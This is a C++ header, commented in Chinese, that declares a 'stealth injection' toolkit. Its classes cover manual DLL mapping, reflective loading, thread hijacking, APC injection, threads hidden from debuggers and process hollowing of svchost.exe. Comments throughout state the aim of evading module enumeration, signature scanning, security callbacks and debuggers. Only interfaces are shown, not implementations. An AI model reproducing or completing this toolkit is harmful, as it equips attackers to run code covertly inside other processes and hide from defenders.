#pragma once
// ============================================================
// stealth_injection.h — 隐蔽代码注入模块
//
// 新增技术:
//   1. Manual Map Injection — 手动解析PE格式，绕过LoadLibrary
//   2. Reflective DLL — 自映射DLL，抹除模块链表痕迹
//   3. Thread Hijacking — 劫持现有线程执行payload
//   4. 隐身线程创建 — NtCreateThreadEx + ThreadHideFromDebugger
//   5. APC Injection — QueueUserAPC隐蔽注入
// ============================================================

#include <Windows.h>
#include <cstdint>
#include <vector>
#include <string>
#include <functional>

namespace stealth {

// ============================================================
// Manual Map Injection — 手动映射 DLL/PE
// 
// 原理: 不调用 LoadLibrary (会在模块链表中留下痕迹),
//       手动执行 LoadLibrary 所做的所有工作:
//       1. 分配内存
//       2. 复制 PE 头和区段
//       3. 执行基址重定位
//       4. 解析导入表 (IAT)
//       5. 调用 TLS 回调
//       6. 调用 DllMain
//
// 规避: 模块枚举、签名扫描、LoadLibrary 回调
// ============================================================

class ManualMapper {
public:
    struct MapResult {
        uintptr_t entryPoint;   // DllMain 地址
        uintptr_t imageBase;    // 映射后的基址
        SIZE_T    imageSize;    // 映射大小
        bool      success;
    };

    // 在目标进程中手动映射 DLL (从文件)
    static MapResult MapDllFromFile(HANDLE hProcess, const wchar_t* dllPath);

    // 在目标进程中手动映射 DLL (从内存 buffer)
    static MapResult MapDllFromBuffer(HANDLE hProcess,
                                       const void* dllData, SIZE_T dllSize);

    // 在当前进程中手动映射 DLL (自注入)
    static MapResult MapDllToSelf(const wchar_t* dllPath);
    static MapResult MapDllToSelf(const void* dllData, SIZE_T dllSize);

    // 执行 DllMain(DLL_PROCESS_ATTACH) 的 shellcode 生成器
    static std::vector<BYTE> GenerateEntrypointShellcode(
        uintptr_t dllMainAddr, uintptr_t imageBase, DWORD fdwReason);

    // 在当前进程中执行 Reflective Loader
    // 优势: 可从内存中加载 DLL，加载完成后抹除 PE 头和 Loader 自身
    // 注意: 当前版本使用 ManualMapper::MapDllToSelf 代理,
    //       完整 ReflectiveLoader 实现位于 ReflectiveLoader 类
    static MapResult ReflectiveLoad(const void* dllData, SIZE_T dllSize);

private:
    ManualMapper() = default;

    // 内部方法已内联到 MapDllFromBuffer 中, 此处仅声明框架
    // (具体实现取决于调用路径, 不作为独立方法暴露)
};

// ============================================================
// Reflective DLL Injection — 自映射加载器
//
// 原理: DLL 中包含一个位置无关的加载器函数 (ReflectiveLoader),
//       直接从已加载的 DLL 镜像中将自身重新映射到新地址,
//       然后执行入口点。之后可擦除原始镜像的痕迹。
//
// 注意: ReflectiveLoader 需要在注入的 DLL 中实现,
//       此处的 GenerateLoaderStub 生成调用加载器的 shellcode
// ============================================================

class ReflectiveLoader {
public:
    // 生成 ReflectiveLoader shellcode (位置无关代码)
    // 可作为独立 shellcode 注入到目标进程中
    static std::vector<BYTE> GenerateLoaderStub();

    // 执行 Reflective Load
    // 返回新映射的 DLL 基址
    static uintptr_t Execute(HANDLE hProcess, const void* dllData, SIZE_T dllSize);

private:
    ReflectiveLoader() = default;
};

// ============================================================
// Thread Hijacking — 劫持现有线程
//
// 原理: 挂起目标进程中的合法线程, 保存其 CONTEXT,
//       修改 RIP 指向我们的 shellcode, 恢复执行。
//       shellcode 执行完毕后恢复原始 CONTEXT。
//
// 优势: 无新线程创建 (规避 NtCreateThreadEx 回调),
//       无新内存分配 (shellcode 写入现有区段)
// ============================================================

class ThreadHijacker {
public:
    // 劫持指定线程执行 shellcode
    static bool HijackThread(HANDLE hProcess, DWORD threadId,
                              const void* shellcode, SIZE_T shellcodeSize);

    // 劫持目标进程中任意线程
    static bool HijackAnyThread(HANDLE hProcess,
                                 const void* shellcode, SIZE_T shellcodeSize);

private:
    ThreadHijacker() = default;

    // 找到目标进程中的第一个非关键线程
    static DWORD FindVictimThread(DWORD processId);
};

// ============================================================
// 隐身线程创建
//
// 规避: NtCreateThreadEx 监控回调 + 调试器附加检测
// ============================================================

class StealthThread {
public:
    // 创建隐藏线程 (ThreadHideFromDebugger)
    // 线程对调试器不可见, 不触发调试事件
    static HANDLE CreateHiddenThread(
        HANDLE hProcess,
        LPTHREAD_START_ROUTINE startAddress,
        PVOID parameter,
        DWORD creationFlags = 0
    );

    // 在当前进程中创建隐藏线程
    static HANDLE CreateHiddenThreadSelf(
        LPTHREAD_START_ROUTINE startAddress,
        PVOID parameter
    );

    // 创建线程并设置 ThreadHideFromDebugger
    // 使用 NtCreateThreadEx 直接系统调用 (绕过 Hook)
    static bool HideThreadFromDebugger(HANDLE hThread);

    // 使用 NtSetInformationThread 隐藏当前线程
    static bool HideCurrentThread();

    // 设置线程的栈伪装 (使线程栈看起来不属于我们)
    static bool SetThreadStackBase(HANDLE hThread, PVOID stackBase);

private:
    StealthThread() = default;
};

// ============================================================
// APC Injection — 异步过程调用注入
//
// 原理: 向目标进程中可警告的线程排队 APC,
//       当线程进入可警告等待状态时执行 payload。
//
// 优势: 不创建新线程, payload 在目标线程上下文执行,
//       难以与正常线程活动区分
// ============================================================

class APCInjector {
public:
    // 向目标进程的所有可警告线程注入 APC
    static bool InjectToAllThreads(HANDLE hProcess,
                                    const void* shellcode, SIZE_T shellcodeSize);

    // 向特定线程注入 APC
    static bool InjectToThread(HANDLE hThread,
                                const void* shellcode, SIZE_T shellcodeSize);

    // 使用 NtQueueApcThread (syscall) 而非 kernel32!QueueUserAPC
    static bool InjectToThreadSyscall(HANDLE hThread,
                                       const void* shellcode, SIZE_T shellcodeSize);

private:
    APCInjector() = default;

    // 枚举进程中所有线程
    static std::vector<DWORD> EnumerateThreads(DWORD processId);
};

// ============================================================
// Process Hollowing — 进程挖空
//
// 原理: 创建挂起的合法进程 (如 svchost.exe),
//       取消映射其原始 PE, 将我们的 payload 映射进去,
//       修改入口点, 恢复执行。
//
// 优势: 进程名合法, 父进程关系正常
// ============================================================

class ProcessHollower {
public:
    // 挖空指定进程并注入 payload
    static bool Hollow(
        const wchar_t* targetProcess,      // e.g. L"svchost.exe"
        const void* payload, SIZE_T payloadSize,
        DWORD* outProcessId = nullptr
    );

    // 挖空一个暂停的进程
    static bool HollowSuspended(
        HANDLE hProcess, HANDLE hThread,
        const void* payload, SIZE_T payloadSize
    );

private:
    ProcessHollower() = default;
};

} // namespace stealth
